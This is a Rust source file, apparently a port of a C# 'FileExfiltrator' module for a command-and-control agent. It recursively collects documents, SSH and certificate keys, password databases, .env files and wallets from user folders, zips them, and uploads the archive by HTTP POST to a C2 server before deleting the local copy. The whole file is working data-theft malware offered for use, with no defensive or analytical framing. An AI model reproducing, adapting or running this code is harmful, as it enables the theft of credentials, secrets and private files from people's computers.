// download.rs — Rust port of download.cs (FileExfiltrator)
// Recursively collects sensitive files, zips them, and exfiltrates via HTTP.

use std::collections::HashSet;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::Duration;
use chrono::Utc;
use log::{info, warn};
use walkdir::WalkDir;
use zip::write::FileOptions;

/// Extensions to collect from user directories
const SENSITIVE_EXTENSIONS: &[&str] = &[
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".txt", ".csv", ".rtf", ".odt", ".ods",
    ".key", ".pem", ".pfx", ".p12", ".crt", ".cer",
    ".rdp", ".kdbx", ".kdb",
    ".sql", ".db", ".sqlite", ".mdb",
    ".json", ".xml", ".yaml", ".yml", ".ini", ".cfg", ".conf",
    ".env", ".log",
    ".wallet", ".dat",
];

/// Maximum file size to collect (10 MB)
const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024;

/// Maximum total collection size (100 MB)
const MAX_TOTAL_SIZE: u64 = 100 * 1024 * 1024;

pub struct FileExfiltrator;

impl FileExfiltrator {
    /// Collects sensitive files from user directories, zips them,
    /// and returns the path to the zip file.
    pub fn collect_files() -> Result<String, String> {
        let search_dirs = get_search_directories();
        let extensions: HashSet<&str> = SENSITIVE_EXTENSIONS.iter().copied().collect();

        let mut collected_files: Vec<PathBuf> = Vec::new();
        let mut total_size: u64 = 0;

        for dir in &search_dirs {
            if !Path::new(dir).exists() {
                continue;
            }

            info!("[*] Scanning: {}", dir);

            for entry in WalkDir::new(dir)
                .max_depth(6)
                .follow_links(false)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                if total_size >= MAX_TOTAL_SIZE {
                    info!("[!] Total size limit reached. Stopping collection.");
                    break;
                }

                let path = entry.path();

                if !path.is_file() {
                    continue;
                }

                // Skip system/hidden directories
                let path_str = path.to_string_lossy().to_lowercase();
                if path_str.contains("\\appdata\\local\\temp")
                    || path_str.contains("/tmp/")
                    || path_str.contains("\\windows\\")
                    || path_str.contains("\\program files")
                    || path_str.contains("node_modules")
                    || path_str.contains(".git")
                {
                    continue;
                }

                // Check extension
                if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                    let dot_ext = format!(".{}", ext.to_lowercase());
                    if !extensions.contains(dot_ext.as_str()) {
                        continue;
                    }
                } else {
                    continue;
                }

                // Check file size
                if let Ok(metadata) = fs::metadata(path) {
                    let size = metadata.len();
                    if size > MAX_FILE_SIZE || size == 0 {
                        continue;
                    }
                    total_size += size;
                    collected_files.push(path.to_path_buf());
                }
            }
        }

        if collected_files.is_empty() {
            return Err("No sensitive files found.".to_string());
        }

        info!("[+] Collected {} files ({} bytes total)", collected_files.len(), total_size);

        // Create ZIP archive
        let zip_name = format!(
            "collection_{}.zip",
            Utc::now().format("%Y%m%d_%H%M%S")
        );
        let zip_path = std::env::temp_dir().join(&zip_name);
        create_zip(&collected_files, &zip_path)?;

        Ok(zip_path.to_string_lossy().to_string())
    }

    /// Exfiltrates collected files to a C2 server via HTTP POST.
    pub async fn exfiltrate(server_url: &str, auth_key: &str, agent_id: &str) -> Result<String, String> {
        let zip_path = Self::collect_files()?;

        let file_data = fs::read(&zip_path)
            .map_err(|e| format!("Failed to read zip: {}", e))?;

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(120))
            .build()
            .map_err(|e| e.to_string())?;

        let file_name = Path::new(&zip_path)
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();

        let form = reqwest::multipart::Form::new()
            .part("file", reqwest::multipart::Part::bytes(file_data)
                .file_name(file_name.clone())
                .mime_str("application/zip")
                .map_err(|e| e.to_string())?
            );

        let url = format!(
            "{}/result?id={}&cmd=exfiltrate&ok=1",
            server_url, agent_id
        );

        let _resp = client
            .post(&url)
            .header("X-Auth", auth_key)
            .multipart(form)
            .send()
            .await
            .map_err(|e| format!("Upload failed: {}", e))?;

        // Cleanup
        let _ = fs::remove_file(&zip_path);

        Ok(format!("Exfiltrated {} successfully.", file_name))
    }

    /// Collects and returns the list of files that would be collected (dry run).
    pub fn scan_only() -> Vec<String> {
        let search_dirs = get_search_directories();
        let extensions: HashSet<&str> = SENSITIVE_EXTENSIONS.iter().copied().collect();
        let mut result = Vec::new();

        for dir in &search_dirs {
            if !Path::new(dir).exists() { continue; }
            for entry in WalkDir::new(dir)
                .max_depth(6)
                .follow_links(false)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                let path = entry.path();
                if !path.is_file() { continue; }

                if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                    let dot_ext = format!(".{}", ext.to_lowercase());
                    if extensions.contains(dot_ext.as_str()) {
                        if let Ok(meta) = fs::metadata(path) {
                            if meta.len() <= MAX_FILE_SIZE && meta.len() > 0 {
                                result.push(format!(
                                    "{} ({}B)",
                                    path.display(),
                                    meta.len()
                                ));
                            }
                        }
                    }
                }
            }
        }

        result
    }
}

// ==================== Helpers ====================

fn get_search_directories() -> Vec<String> {
    let mut dirs = Vec::new();

    #[cfg(target_os = "windows")]
    {
        if let Ok(profile) = std::env::var("USERPROFILE") {
            dirs.push(format!("{}\\Desktop", profile));
            dirs.push(format!("{}\\Documents", profile));
            dirs.push(format!("{}\\Downloads", profile));
            dirs.push(format!("{}\\Pictures", profile));
        }
        if let Ok(appdata) = std::env::var("APPDATA") {
            dirs.push(appdata);
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(home) = std::env::var("HOME") {
            dirs.push(format!("{}/Desktop", home));
            dirs.push(format!("{}/Documents", home));
            dirs.push(format!("{}/Downloads", home));
            dirs.push(format!("{}/Pictures", home));
            dirs.push(format!("{}/.config", home));
            dirs.push(format!("{}/.ssh", home));
        }
    }

    dirs
}

fn create_zip(files: &[PathBuf], zip_path: &Path) -> Result<(), String> {
    let file = fs::File::create(zip_path)
        .map_err(|e| format!("Failed to create zip file: {}", e))?;

    let mut zip = zip::ZipWriter::new(file);
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);

    for path in files {
        let name = path
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();

        match fs::read(path) {
            Ok(data) => {
                if let Err(e) = zip.start_file(&name, options) {
                    warn!("Failed to add {} to zip: {}", name, e);
                    continue;
                }
                if let Err(e) = zip.write_all(&data) {
                    warn!("Failed to write {} to zip: {}", name, e);
                }
            }
            Err(e) => {
                warn!("Failed to read {}: {}", path.display(), e);
            }
        }
    }

    zip.finish().map_err(|e| format!("Failed to finalize zip: {}", e))?;
    Ok(())
}
